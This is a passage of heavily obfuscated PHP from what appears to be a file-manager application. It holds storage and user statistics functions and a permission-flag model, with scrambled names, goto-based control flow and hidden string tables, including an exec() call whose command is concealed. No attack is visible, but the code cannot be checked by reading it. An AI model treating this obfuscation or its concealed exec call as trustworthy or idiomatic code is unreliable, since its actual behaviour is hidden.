ì®êÊ˜Õ)->sum($EÌÔµÃïãÚ[77]); goto E¯Ûóœ¡˜; D¹°Š–Æ½: $eÒÁÖĞ’š£ = Model($EÌÔµÃïãÚ[752])->where($b ì®êÊ˜Õ)->sum($EÌÔµÃïãÚ[77]); $B‰™š’˜…ø = array($EÌÔµÃïãÚ[210] => $e›Œ«ÜÛ©, $EÌÔµÃïãÚ[697] => (int) $dÅóê½·‡á, $EÌÔµÃïãÚ[2037] => (int) $fˆ¾­¾³èæ, $EÌÔµÃïãÚ[2038] => (int) $D÷§Õ£òÊë, $EÌÔµÃïãÚ[2039] => (int) $eÒÁÖĞ’š£); return $this->insert($B‰™š’˜…ø); goto aİ¯ŞÄ¤•Œ; E¯Ûóœ¡˜: $b ì®êÊ˜Õ[$EÌÔµÃïãÚ[371]] = 1; $D÷§Õ£òÊë = Model($EÌÔµÃïãÚ[752])->where($b ì®êÊ˜Õ)->sum($EÌÔµÃïãÚ[77]); $b ì®êÊ˜Õ[$EÌÔµÃïãÚ[371]] = 2; goto D¹°Š–Æ½; cƒ®êÆ”„: $EÌÔµÃïãÚ =& $_SERVER[‚Ğ°–—î]; $BŠºÈò¨ = strtotime(date($EÌÔµÃïãÚ[2045], strtotime($e›Œ«ÜÛ©))); $b ì®êÊ˜Õ = array($EÌÔµÃïãÚ[187] => array($EÌÔµÃïãÚ[928], $BŠºÈò¨)); goto F ‹Îí¥°Ä; aİ¯ŞÄ¤•Œ: } public function trend($eÉÖ„ö‡ã, $bò˜ÏÑ®ÍÂ) { goto fê¥­ñ±É; CèÆ´ÓÜ: if (empty($e‘À¢‘šÄ)) { $DëÔÀê¹Ì = date($A²¹ã¢ìöµ[2040], strtotime($A²¹ã¢ìöµ[2041])); $B«ÇÁà“Ï¤ = array($A²¹ã¢ìöµ[210] => $DëÔÀê¹Ì); foreach ($F¤ÀŠô¹Æâ[$eÉÖ„ö‡ã] as $C„ÉÕÒÃĞÏ => $e¥‰òÊ¦Ã¸) { $B«ÇÁà“Ï¤[$C„ÉÕÒÃĞÏ] = 0; } $e‘À¢‘šÄ[] = $B«ÇÁà“Ï¤; } $dì¸ºæ‹º = array(); foreach ($e‘À¢‘šÄ as $e¥‰òÊ¦Ã¸) { if ($eÉÖ„ö‡ã == $A²¹ã¢ìöµ[2035] && $e¥‰òÊ¦Ã¸[$A²¹ã¢ìöµ[2037]] > $e¥‰òÊ¦Ã¸[$A²¹ã¢ìöµ[697]]) { $e¥‰òÊ¦Ã¸[$A²¹ã¢ìöµ[2037]] = $e¥‰òÊ¦Ã¸[$A²¹ã¢ìöµ[697]]; } foreach ($F¤ÀŠô¹Æâ[$eÉÖ„ö‡ã] as $C„ÉÕÒÃĞÏ => $d¼›œ©§ö) { $bœ²îù = array($A²¹ã¢ìöµ[210] => $e¥‰òÊ¦Ã¸[$A²¹ã¢ìöµ[210]], $A²¹ã¢ìöµ[1344] => $d¼›œ©§ö); $bœ²îù[$cŠìÙ«ÅĞæ[$eÉÖ„ö‡ã]] = isset($e¥‰òÊ¦Ã¸[$C„ÉÕÒÃĞÏ]) ? $e¥‰òÊ¦Ã¸[$C„ÉÕÒÃĞÏ] : 0; $dì¸ºæ‹º[] = $bœ²îù; } } goto c›ÕÀ‹“¶; fê¥­ñ±É: $A²¹ã¢ìöµ =& $_SERVER[‚Ğ°–—î]; if (!$this->init($eÉÖ„ö‡ã)) { return !1; } $e‘À¢‘šÄ = $this->trendList($eÉÖ„ö‡ã); goto C“çËÉ…; C“çËÉ…: if ($e‘À¢‘šÄ && $bò˜ÏÑ®ÍÂ != $A²¹ã¢ìöµ[1413]) { $BÓ‹‡ÚÅÉ = $e‘À¢‘šÄ[0][$A²¹ã¢ìöµ[210]]; $E‹°¢‰èŠ = $this->validDate($bò˜ÏÑ®ÍÂ, $BÓ‹‡ÚÅÉ); $e†ƒô¾Šø = array(); $d¨ËÆÛÍ¾ˆ = array_to_keyvalue($e‘À¢‘šÄ, $A²¹ã¢ìöµ[210]); foreach ($E‹°¢‰èŠ as $DëÔÀê¹Ì) { if (isset($d¨ËÆÛÍ¾ˆ[$DëÔÀê¹Ì])) { $bœ²îù = $d¨ËÆÛÍ¾ˆ[$DëÔÀê¹Ì]; } else { $bœ²îù = end($e‘À¢‘šÄ); $bœ²îù[$A²¹ã¢ìöµ[210]] = $DëÔÀê¹Ì; if ($eÉÖ„ö‡ã == $A²¹ã¢ìöµ[535]) { $bœ²îù[$A²¹ã¢ìöµ[2033]] = $bœ²îù[$A²¹ã¢ìöµ[2034]] = 0; } } $e†ƒô¾Šø[] = $bœ²îù; } $e‘À¢‘šÄ = $e†ƒô¾Šø; } $F¤ÀŠô¹Æâ = array($A²¹ã¢ìöµ[535] => array($A²¹ã¢ìöµ[699] => LNG($A²¹ã¢ìöµ[2049]), $A²¹ã¢ìöµ[2033] => LNG($A²¹ã¢ìöµ[2050]), $A²¹ã¢ìöµ[2034] => LNG($A²¹ã¢ìöµ[2051])), $A²¹ã¢ìöµ[2035] => array($A²¹ã¢ìöµ[697] => LNG($A²¹ã¢ìöµ[2052]), $A²¹ã¢ìöµ[2037] => LNG($A²¹ã¢ìöµ[2053]), $A²¹ã¢ìöµ[2038] => LNG($A²¹ã¢ìöµ[2054]), $A²¹ã¢ìöµ[2039] => LNG($A²¹ã¢ìöµ[2055]))); $cŠìÙ«ÅĞæ = array($A²¹ã¢ìöµ[535] => $A²¹ã¢ìöµ[2056], $A²¹ã¢ìöµ[2035] => $A²¹ã¢ìöµ[77]); goto CèÆ´ÓÜ; c›ÕÀ‹“¶: return $dì¸ºæ‹º; goto f–½±´Ëï; f–½±´Ëï: } public function validDate($CğÁñšÎÔà, $B¦±Ÿ½”Ğ¡) { goto Aä—Ş¯¤ˆ; Aä—Ş¯¤ˆ: $EæßØè¯Œ½ =& $_SERVER[‚Ğ°–—î]; $aÄØ‡ĞŠä = date($EæßØè¯Œ½[2040], strtotime($EæßØè¯Œ½[2041])); $cÜ½ÎéÌŠ = array($aÄØ‡ĞŠä); goto bí¢Ò¨‚÷; B§…‘¹æÌÑ: return $cÜ½ÎéÌŠ; goto C±«ÇÇ†à‡; bí¢Ò¨‚÷: switch ($CğÁñšÎÔà) { case $EæßØè¯Œ½[1420]: $Dá¥ÕŸÉ†Â = mktime(0, 0, 0, date($EæßØè¯Œ½[2057]), date($EæßØè¯Œ½[2058]) - date($EæßØè¯Œ½[1226]) + 7 - 7, date($EæßØè¯Œ½[2059])); $F¼ô¯ÛÙè = 0; do { $A±¬Ğ»ó = date($EæßØè¯Œ½[2040], $Dá¥ÕŸÉ†Â - 3600 * 24 * 7 * $F¼ô¯ÛÙè); $cÜ½ÎéÌŠ[] = $A±¬Ğ»ó; $F¼ô¯ÛÙè++; } while ($B¦±Ÿ½”Ğ¡ < $A±¬Ğ»ó); break; case $EæßØè¯Œ½[1418]: $F¼ô¯ÛÙè = 1; do { $cí·ğ”¿è¯ = date($EæßØè¯Œ½[2060], strtotime("\55\40{$F¼ô¯ÛÙè}\40\x6d\157\156\x74\150\x73")); $cÜ½ÎéÌŠ[] = $cí·ğ”¿è¯; $F¼ô¯ÛÙè++; } while ($B¦±Ÿ½”Ğ¡ < $cí·ğ”¿è¯); break; case $EæßØè¯Œ½[1727]: $f“ä‰÷ƒØá = (int) date($EæßØè¯Œ½[2059], strtotime($B¦±Ÿ½”Ğ¡)); $C‚ŒÛ§Ê = (int) date($EæßØè¯Œ½[2059]); if ($f“ä‰÷ƒØá >= $C‚ŒÛ§Ê) { break; } for ($f“ä‰÷ƒØá; $f“ä‰÷ƒØá < $C‚ŒÛ§Ê; $f“ä‰÷ƒØá++) { $cÜ½ÎéÌŠ[] = $f“ä‰÷ƒØá . $EæßØè¯Œ½[2061]; } break; default: break; } if ($B¦±Ÿ½”Ğ¡ > end($cÜ½ÎéÌŠ)) { array_pop($cÜ½ÎéÌŠ); } sort($cÜ½ÎéÌŠ); goto B§…‘¹æÌÑ; C±«ÇÇ†à‡: } public function listTable($CäŠ‘ğÀ†ê) { $fùšˆÅĞÅ = ucfirst($CäŠ‘ğÀ†ê); return Model($fùšˆÅĞÅ)->listData(); } public function option($d²ÕáÌêÑ) { $d§ì…Ç½¾Ú = $_SERVER[‚Ğ°–—î][2062] . ucfirst($d²ÕáÌêÑ); return $this->{$d§ì…Ç½¾Ú}(); } private function optionUser() { goto d©Óè˜èŞ; d©Óè˜èŞ: $Aä»­ß’íˆ =& $_SERVER[‚Ğ°–—î]; $e»¨…Ê´Ú© = Model($Aä»­ß’íˆ[477])->count($Aä»­ß’íˆ[1438]); $e‰†¦­à™ = Model($Aä»­ß’íˆ[477])->where($Aä»­ß’íˆ[2063])->count($Aä»­ß’íˆ[1438]); goto C¶½¡ğ¿íé; C§ßí‰½“Â: $e»Û ïšà˜ = Model($Aä»­ß’íˆ[477])->where($Dê˜âåàÁ¯)->count($Aä»­ß’íˆ[1438]); return array($Aä»­ß’íˆ[694] => (int) $e»¨…Ê´Ú©, $Aä»­ß’íˆ[2066] => (int) ($e»¨…Ê´Ú© - $e‰†¦­à™), $Aä»­ß’íˆ[2067] => (int) $e‰†¦­à™, $Aä»­ß’íˆ[2068] => (int) $e»Û ïšà˜, $Aä»­ß’íˆ[2069] => $f©ÜÙ”¤ö´); goto E—Ç‹á˜ù; dÎ¤á—á­Ÿ: if (!$f©ÜÙ”¤ö´) { $f©ÜÙ”¤ö´ = 1; } $AÚ·ß‰Ë­õ = strtotime(date($Aä»­ß’íˆ[2044])); $Dê˜âåàÁ¯ = array($Aä»­ß’íˆ[2065] => array($Aä»­ß’íˆ[929], $AÚ·ß‰Ë­õ)); goto C§ßí‰½“Â; C¶½¡ğ¿íé: $AÚ·ß‰Ë­õ = strtotime($Aä»­ß’íˆ[2064]); $Dê˜âåàÁ¯ = array($Aä»­ß’íˆ[2065] => array($Aä»­ß’íˆ[929], $AÚ·ß‰Ë­õ)); $f©ÜÙ”¤ö´ = (int) Model($Aä»­ß’íˆ[477])->where($Dê˜âåàÁ¯)->count($Aä»­ß’íˆ[1438]); goto dÎ¤á—á­Ÿ; E—Ç‹á˜ù: } private function optionFile() { goto DÜ‘õÜ‰‰; b«—Ï‡õ›Í: $CÕØÏ„œŠä = $aê‘¦…’æ°[$BäÜ†Œ‡Ó³[2037]]; $AÃˆŞæœ ˆ = Model($BäÜ†Œ‡Ó³[752])->where(array($BäÜ†Œ‡Ó³[370] => 0))->count($BäÜ†Œ‡Ó³[369]); $f’òÅÎÓ = array($BäÜ†Œ‡Ó³[370] => 0, $BäÜ†Œ‡Ó³[187] => array($BäÜ†Œ‡Ó³[929], strtotime(date($BäÜ†Œ‡Ó³[2044])))); goto eåˆˆæã­Ñ; DÜ‘õÜ‰‰: $BäÜ†Œ‡Ó³ =& $_SERVER[‚Ğ°–—î]; $aê‘¦…’æ° = $this->sourceSize(); $cù¸„¢ÎÉ = $aê‘¦…’æ°[$BäÜ†Œ‡Ó³[77]]; goto b«—Ï‡õ›Í; eåˆˆæã­Ñ: $F½«óó»Ó = Model($BäÜ†Œ‡Ó³[752])->where($f’òÅÎÓ)->sum($BäÜ†Œ‡Ó³[77]); $dÈÄÉ…²ïµ = Model($BäÜ†Œ‡Ó³[752])->where($f’òÅÎÓ)->count($BäÜ†Œ‡Ó³[369]); return array($BäÜ†Œ‡Ó³[697] => $cù¸„¢ÎÉ, $BäÜ†Œ‡Ó³[2037] => $CÕØÏ„œŠä, $BäÜ†Œ‡Ó³[2070] => $cù¸„¢ÎÉ - $CÕØÏ„œŠä, $BäÜ†Œ‡Ó³[2071] => (int) $F½«óó»Ó, $BäÜ†Œ‡Ó³[699] => (int) $AÃˆŞæœ ˆ, $BäÜ†Œ‡Ó³[2072] => (int) $dÈÄÉ…²ïµ); goto D‹ÖèîØ†Ñ; D‹ÖèîØ†Ñ: } private function optionAccess() { $bÀÔÇòÆ¨ =& $_SERVER[‚Ğ°–—î]; return array($bÀÔÇòÆ¨[694] => $this->typeLogCnt(), $bÀÔÇòÆ¨[103] => $this->typeLogCnt($bÀÔÇòÆ¨[103]), $bÀÔÇòÆ¨[404] => $this->typeLogCnt($bÀÔÇòÆ¨[404]), $bÀÔÇòÆ¨[2073] => $this->typeLogCnt($bÀÔÇòÆ¨[2073]), $bÀÔÇòÆ¨[2074] => $this->typeLogCnt($bÀÔÇòÆ¨[2074]), $bÀÔÇòÆ¨[535] => $this->typeLogCnt($bÀÔÇòÆ¨[33], $bÀÔÇòÆ¨[2048])); } private function typeLogCnt($fÊÒÁËƒ  = '', $D¼ÉîºÖ¢ = "\151\144") { goto B§¨¿İ±§Á; dËï¨ùù: return (int) $cùƒÈöÒÏ…; goto Dö°ìœ”´; D‚Î°ÜÀÑÕ: $E´Ë”§‘Âí = array($BÛõ®¢‘‘…[187] => array($BÛõ®¢‘‘…[929], $d¡àîóâ¾õ)); if ($fÊÒÁËƒ ) { $E´Ë”§‘Âí[$BÛõ®¢‘‘…[29]] = array($BÛõ®¢‘‘…[7], $e¢÷–åø†ä[$fÊÒÁËƒ ]); } $cùƒÈöÒÏ… = Model($BÛõ®¢‘‘…[2047])->where($E´Ë”§‘Âí)->count($D¼ÉîºÖ¢); goto dËï¨ùù; B§¨¿İ±§Á: $BÛõ®¢‘‘… =& $_SERVER[‚Ğ°–—î]; $e¢÷–åø†ä = array($BÛõ®¢‘‘…[103] => array($BÛõ®¢‘‘…[2075], $BÛõ®¢‘‘…[2076]), $BÛõ®¢‘‘…[404] => array($BÛõ®¢‘‘…[2077], $BÛõ®¢‘‘…[2078]), $BÛõ®¢‘‘…[2073] => array($BÛõ®¢‘‘…[2079], $BÛõ®¢‘‘…[2080], $BÛõ®¢‘‘…[2081]), $BÛõ®¢‘‘…[2074] => array($BÛõ®¢‘‘…[2082], $BÛõ®¢‘‘…[2083]), $BÛõ®¢‘‘…[2084] => array($BÛõ®¢‘‘…[2085], $BÛõ®¢‘‘…[2086], $BÛõ®¢‘‘…[2087])); $d¡àîóâ¾õ = strtotime(date($BÛõ®¢‘‘…[2044])); goto D‚Î°ÜÀÑÕ; Dö°ìœ”´: } private function optionServer() { goto d¨¤ç”Òê; eñ‚Ù’ßŠì: $CÖÎö¶Óö = array($FŒ‰Œƒ’š¹[743] => $C§ï¢«¾†‘[$FŒ‰Œƒ’š¹[367]]); $A©ÆÊ‘ñÆê = Model($FŒ‰Œƒ’š¹[422])->where($CÖÎö¶Óö)->sum($FŒ‰Œƒ’š¹[77]); $FöÓ„†ç = explode($FŒ‰Œƒ’š¹[50], $_SERVER[$FŒ‰Œƒ’š¹[139]]); goto fÒ¨êŞÎ®; d¨¤ç”Òê: $FŒ‰Œƒ’š¹ =& $_SERVER[‚Ğ°–—î]; $fÒ†­ïù¨Å = $this->diskDriver(); $C§ï¢«¾†‘ = KodIO::defaultDriver(); goto eñ‚Ù’ßŠì; Bïãó®­‡Ğ: return array($FŒ‰Œƒ’š¹[2090] => $fÒ†­ïù¨Å ? $fÒ†­ïù¨Å[$FŒ‰Œƒ’š¹[2091]] : 0, $FŒ‰Œƒ’š¹[2092] => $fÒ†­ïù¨Å ? $fÒ†­ïù¨Å[$FŒ‰Œƒ’š¹[2093]] : 0, $FŒ‰Œƒ’š¹[2094] => (int) $C§ï¢«¾†‘[$FŒ‰Œƒ’š¹[2091]] * 1024 * 1024 * 1024, $FŒ‰Œƒ’š¹[2095] => (int) $A©ÆÊ‘ñÆê, $FŒ‰Œƒ’š¹[2096] => ucfirst($B»›‘öã¤), $FŒ‰Œƒ’š¹[2097] => $FŒ‰Œƒ’š¹[2098] . PHP_VERSION, $FŒ‰Œƒ’š¹[2099] => phpBuild64() ? 64 : 32, $FŒ‰Œƒ’š¹[693] => str_replace($FŒ‰Œƒ’š¹[2100], $FŒ‰Œƒ’š¹[905], $f‰š‡…Î…¢), $FŒ‰Œƒ’š¹[337] => ucfirst($A´…·«¯„Ó), $FŒ‰Œƒ’š¹[28] => $_SERVER[$FŒ‰Œƒ’š¹[2101]]); goto Eˆ×âÚºõ¾; fÒ¨êŞÎ®: $B»›‘öã¤ = $FöÓ„†ç[0]; $b¿‡‰§Ù¢“ = $GLOBALS[$FŒ‰Œƒ’š¹[6]][$FŒ‰Œƒ’š¹[17]]; $f‰š‡…Î…¢ = $b¿‡‰§Ù¢“[$FŒ‰Œƒ’š¹[889]]; goto c¤Šãóš; c¤Šãóš: if ($f‰š‡…Î…¢ == $FŒ‰Œƒ’š¹[723]) { $cæ¦Ÿ¶ÊÓ¼ = explode($FŒ‰Œƒ’š¹[1077], $b¿‡‰§Ù¢“[$FŒ‰Œƒ’š¹[888]]); $f‰š‡…Î…¢ = $cæ¦Ÿ¶ÊÓ¼[0]; } if ($f‰š‡…Î…¢ == $FŒ‰Œƒ’š¹[726] || $f‰š‡…Î…¢ == $FŒ‰Œƒ’š¹[727]) { $fŸÚà³â¸ê = Model()->db()->query($FŒ‰Œƒ’š¹[2088]); $aÆÀÔë¥ÉÔ = $fŸÚà³â¸ê[0] && isset($fŸÚà³â¸ê[0][$FŒ‰Œƒ’š¹[1343]]) ? $fŸÚà³â¸ê[0][$FŒ‰Œƒ’š¹[1343]] : 0; $f‰š‡…Î…¢ = $FŒ‰Œƒ’š¹[2089] . ($aÆÀÔë¥ÉÔ ? $FŒ‰Œƒ’š¹[8] . $aÆÀÔë¥ÉÔ : $FŒ‰Œƒ’š¹[33]); } $A´…·«¯„Ó = $GLOBALS[$FŒ‰Œƒ’š¹[6]][$FŒ‰Œƒ’š¹[337]][$FŒ‰Œƒ’š¹[754]]; goto Bïãó®­‡Ğ; Eˆ×âÚºõ¾: } private function diskDriver() { goto cØŒõ‚Å¤; dƒĞÙÙºœœ: $E¾®ßº¼àÇ = $fâÓ©ˆ¾Ÿ¸ - @disk_free_space($aé‰‘ßÔŒ²); return array($CšÎİãô×¢[2091] => $fâÓ©ˆ¾Ÿ¸, $CšÎİãô×¢[2093] => $E¾®ßº¼àÇ); goto FŸÑÃÍá–; cØŒõ‚Å¤: $CšÎİãô×¢ =& $_SERVER[‚Ğ°–—î]; $aé‰‘ßÔŒ² = $CšÎİãô×¢[8]; $eËí‚ˆ…Íß = $GLOBALS[$CšÎİãô×¢[6]][$CšÎİãô×¢[2102]] == $CšÎİãô×¢[2103]; goto døìëÀ‘¬; døìëÀ‘¬: if ($eËí‚ˆ…Íß) { $aé‰‘ßÔŒ² = $CšÎİãô×¢[2104]; if (function_exists($CšÎİãô×¢[2105])) { exec($CšÎİãô×¢[2106], $B‘¥Ö¾¸òæ); $aé‰‘ßÔŒ² = $B‘¥Ö¾¸òæ[1] . $CšÎİãô×¢[8]; } } if (!file_exists($aé‰‘ßÔŒ²)) { return; } $fâÓ©ˆ¾Ÿ¸ = @disk_total_space($aé‰‘ßÔŒ²); goto dƒĞÙÙºœœ; FŸÑÃÍá–: } public function fileChart($CÒ³…© “¤) { goto c¨²·‡ˆò¯; bİÎÇ‹ˆÒ: $AÆ•Å¨·Ïï[$C…Ç›‘Ï—Ş[371]] = 2; $cÁÕÒ‹ß«¼ = Model($C…Ç›‘Ï—Ş[752])->where($AÆ•Å¨·Ïï)->sum($C…Ç›‘Ï—Ş[77]); return array($C…Ç›‘Ï—Ş[697] => $EÖÏ¡êùµ [$C…Ç›‘Ï—Ş[77]], $C…Ç›‘Ï—Ş[2037] => $EÖÏ¡êùµ [$C…Ç›‘Ï—Ş[2037]], $C…Ç›‘Ï—Ş[2038] => (int) $DùŸ°³ÑÃ, $C…Ç›‘Ï—Ş[2039] => (int) $cÁÕÒ‹ß«¼); goto B«æ„Ò¢Œ; cÎ†İÚÆó»: $EÖÏ¡êùµ  = $this->sourceSize(); $AÆ•Å¨·Ïï = array($C…Ç›‘Ï—Ş[461] => 0, $C…Ç›‘Ï—Ş[371] => 1); $DùŸ°³ÑÃ = Model($C…Ç›‘Ï—Ş[752])->where($AÆ•Å¨·Ïï)->sum($C…Ç›‘Ï—Ş[77]); goto bİÎÇ‹ˆÒ; c¨²·‡ˆò¯: $C…Ç›‘Ï—Ş =& $_SERVER[‚Ğ°–—î]; if (isset($CÒ³…© “¤[$C…Ç›‘Ï—Ş[1438]])) { return Model($C…Ç›‘Ï—Ş[752])->userFileTypeProfile($CÒ³…© “¤[$C…Ç›‘Ï—Ş[1438]]); } if (isset($CÒ³…© “¤[$C…Ç›‘Ï—Ş[2107]])) { return Model($C…Ç›‘Ï—Ş[752])->groupFileTypeProfile($CÒ³…© “¤[$C…Ç›‘Ï—Ş[2107]]); } goto cÎ†İÚÆó»; B«æ„Ò¢Œ: } private function sourceSize() { $föÍÇÖ¯ÙŸ =& $_SERVER[‚Ğ°–—î]; $D­æ‡à‚…å = Model($föÍÇÖ¯ÙŸ[752])->where(array($föÍÇÖ¯ÙŸ[370] => 0))->sum($föÍÇÖ¯ÙŸ[77]); $F÷¦Ç« = Model($föÍÇÖ¯ÙŸ[422])->sum($föÍÇÖ¯ÙŸ[77]); if ($F÷¦Ç« > $D­æ‡à‚…å) { $F÷¦Ç« = $D­æ‡à‚…å; } return array($föÍÇÖ¯ÙŸ[77] => (int) $D­æ‡à‚…å, $föÍÇÖ¯ÙŸ[2037] => (int) $F÷¦Ç«); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $bõ÷Ì´¢¢’ =& $_SERVER[‚Ğ°–—î]; $cõÌÑ«®Ğ = array(array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2108]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2110], $bõ÷Ì´¢¢’[2111] => 6, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2114]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2115], $bõ÷Ì´¢¢’[2111] => 1, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2116]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2117], $bõ÷Ì´¢¢’[2111] => 2, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2118]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2117], $bõ÷Ì´¢¢’[2111] => 3, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2119]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2120], $bõ÷Ì´¢¢’[2111] => 4, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => self::AUTH_SHOW | self::AUTH_VIEW), array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2121]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2122], $bõ÷Ì´¢¢’[2111] => 5, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bõ÷Ì´¢¢’[386] => LNG($bõ÷Ì´¢¢’[2123]), $bõ÷Ì´¢¢’[2109] => $bõ÷Ì´¢¢’[2124], $bõ÷Ì´¢¢’[2111] => 7, $bõ÷Ì´¢¢’[2112] => 1, $bõ÷Ì´¢¢’[2113] => 0)); return $cõÌÑ«®Ğ; } public static function authCheck($bÆÊ¸†ÓØƒ, $Aº¨”¥‡‹‡) { $bÆÊ¸†ÓØƒ = intval($bÆÊ¸†ÓØƒ); if (_get($GLOBALS, $_SERVER[‚Ğ°–—î][457])) { return !0; } if ($bÆÊ¸†ÓØƒ <= 0) { return !1; } if (($bÆÊ¸†ÓØƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($bÆÊ¸†ÓØƒ & $Aº¨”¥‡‹‡); } public static function authCheckShow($fÊÜ¶¤µ) { return self::authCheck($fÊÜ¶¤µ, self::AUTH_SHOW); } public static function authCheckView($F‚èÑÎ—ÈØ) { return self::authCheck($F‚èÑÎ—ÈØ, self::AUTH_VIEW); } public static function authCheckDownload($d—‡Ùåİ¢) { return self::authCheck($d—‡Ùåİ¢, self::AUTH_DOWNLOAD); } public static function authCheckUpload($AîÍÄÂÉ‡Ó) { return self::authCheck($AîÍÄÂÉ‡Ó, self::AUTH_UPLOAD); } public static function authCheckEdit($b˜ö…‹Ğ¤§) { return self::authCheck($b˜ö…‹Ğ¤§, self::AUTH_EDIT); } public static function authCheckRemove($fÅ†¼ŸÍî˜) { return self::authCheck($fÅ†¼ŸÍî˜, self::AUTH_REMOVE); } public static function authCheckShare($FçŒ•ŠïïÈ) { return self::authCheck($FçŒ•ŠïïÈ, self::AUTH_SHARE); } public static function authCheckComment($D“§ ÛÄ) { return self::authCheck($D“§ ÛÄ, self::AUTH_COMMENT); } public static function authCheckEvent($EøîÚ‚êŠ) { return self::authCheck($EøîÚ‚êŠ, self::AUTH_EVENT); } public static function authCheckRoot($b‚×–­èÆ) { return self::authCheck($b‚×–­èÆ, self::AUTH_ROOT); } public static function authDisable($EÂ¨¸—œˆÑ, $EÓèˆÉ½†) { if (intval($EÂ¨¸—œˆÑ) <= 0) { return 0; } return intval($EÂ¨¸—œˆÑ) & ~$EÓèˆÉ½†; } public $optionType = "\x53\x79\163\164\145\x6d\x2e\163\157\x75\x72\143\145\101\x75\164\x68\114\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x61\165\x74\150", "\x6c\141\x62\145\154", "\x64\x69\163\160\154\141\x79", "\163\x79\x73\164\145\x6d", "\x73\x6f\162\x74"); public function initData() { $FÌîëÏó÷ = $this->authDefault(); foreach ($FÌîëÏó÷ as $f¿öÚ”ğ£ˆ) { $this->add($f¿öÚ”ğ£ˆ); } } public function listData($AŞ§È’™™ = false, $c„òá³¦Ã… = "\163\x6f\x72\164", $d“Òº“æÃ¦ = false) { return parent::listData($AŞ§È’™™, $c„òá³¦Ã…, $d“Òº“æÃ¦); } public function update($b¿»®“†Ó¤, $D†¡‚Ú¨ĞÒ) { $A”‰ßœÌ’’ =& $_SERVER[‚Ğ°–—î]; $d˜Ú¤Úê‰É = parent::listData($b¿»®“†Ó¤); $CÊëšØ¯Á = $this->findByName($D†¡‚Ú¨ĞÒ[$A”‰ßœÌ’’[28]]); if (!$d˜Ú¤Úê‰É || $CÊëšØ¯Á && $CÊëšØ¯Á[$A”‰ßœÌ’’[367]] != $d˜Ú¤Úê‰É[$A”‰ßœÌ’’[367]]) { return !1; } $this->filterAuth($D†¡‚Ú¨ĞÒ[$A”‰ßœÌ’’[376]]); return parent::update($b¿»®“†Ó¤, $D†¡‚Ú¨ĞÒ); } public function remove($D‘¶ÂËªºİ) { $fÃ…±ÜÄã = parent::listData($D‘¶ÂËªºİ); if (!$fÃ…±ÜÄã || $fÃ…±ÜÄã[$_SERVER[‚Ğ°–—î][1081]]) { return !1; } return parent::remove($D‘¶ÂËªºİ); } public function add($B³µåÑ¯½å = array()) { goto a¹±ÄïƒÒÇ; eìÙ°±öò: $B³µåÑ¯½å = array_merge($EÙÆ•ŠƒÙ¦, $B³µåÑ¯½å); $B³µåÑ¯½å[$C«Áòİåµ½[2128]] = $this->getSort(); $this->filterAuth($B³µåÑ¯½å[$C«Áòİåµ½[376]]); goto c›áŒßàí; a¹±ÄïƒÒÇ: $C«Áòİåµ½ =& $_SERVER[‚Ğ°–—î]; if ($this->findByName($B³µåÑ¯½å[$C«Áòİåµ½[28]])) { return !1; } $EÙÆ•ŠƒÙ¦ = array($C«Áòİåµ½[28] => $C«Áòİåµ½[33], $C«Áòİåµ½[376] => 1, $C«Áòİåµ½[2125] => $C«Áòİåµ½[2126], $C«Áòİåµ½[2127] => 1, $C«Áòİåµ½[1081] => 0, $C«Áòİåµ½[2128] => 0); goto eìÙ°±öò; c›áŒßàí: return parent::insert($B³µåÑ¯½å); goto Bªñ¤Æ¢ ; Bªñ¤Æ¢ : } private function getSort() { $dŠ²ˆ­®…’ =& $_SERVER[‚Ğ°–—î]; $A­Ÿ‚Î· æ = parent::listData(); $a½«è‚ˆ‚  = array_to_keyvalue($A­Ÿ‚Î· æ, $dŠ²ˆ­®…’[33], $dŠ²ˆ­®…’[2128]); return empty($a½«è‚ˆ‚ ) ? 0 : max($a½«è‚ˆ‚ ) + 1; } private function filterAuth(&$BŒ”Æœß¦) { goto aÚµ±áÁò; c®çì™ÊÍŒ: foreach ($FÜ•‡›•òÈ as 